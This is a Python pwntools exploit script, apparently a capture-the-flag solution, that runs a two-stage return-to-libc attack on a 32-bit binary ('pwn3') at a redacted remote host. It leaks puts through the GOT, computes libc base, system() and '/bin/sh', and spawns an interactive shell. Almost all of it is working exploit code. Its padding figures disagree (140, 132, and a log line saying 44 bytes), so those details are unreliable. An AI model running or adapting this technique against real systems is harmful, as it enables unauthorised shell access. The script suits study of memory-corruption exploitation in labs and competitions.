from pwn import *

r = remote('REDACTED', REDACTED)
#r = process('./pwn3')
libc = ELF('./libc.so.6')
offset = 140
puts_plt = 0x8048340
puts_got = 0x80497b0
gets_plt = 0x8048330
gets_got = 0x80497ac
main_plt = 0x0804847d
# Stage 1 payload
# ------------------------
payload = ""
payload += "A"*offset
payload += p32(puts_plt)
payload += p32(main_plt)
payload += p32(puts_got)
r.recvuntil('desert:')
log.info(
    'Payload format: [140 bytes buffer] + [puts() addr] + [main() addr] + [puts@got]')
r.sendline(payload)
r.recvline()
puts_leak = u32(r.recvline()[:4])
log.info('Puts leak: {}'.format(hex(puts_leak)))
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
binsh_offset = next(libc.search('/bin/sh\x00'))
libc_base = puts_leak - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
exit_addr = libc_base + exit_offset
log.info('Formula to compute the addresses we need:')
log.info('libc_base = puts_leak - puts_offset')
log.info('system_address = libc_base + system_offset')
log.info('bin_sh_address = libc_base + bin_sh_offset')
log.info('libc base: {}'.format(hex(libc_base)))
log.info('system() addr: {}'.format(hex(system_addr)))
log.info('/bin/sh addr: {}'.format(hex(binsh_addr)))
# Stage 2 payload
# -----------------------
payload = ""
payload += "A"*132
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)
log.info(
    'Payload format: [44 bytes buffer] + [system() addr] + [4 bytes garbage] + [/bin/sh addr]')
log.info('Sending stage 2 payload.')
log.info('Enjoy your shell! :)')
r.recvuntil('desert: ')
r.sendline(payload)
r.interactive()
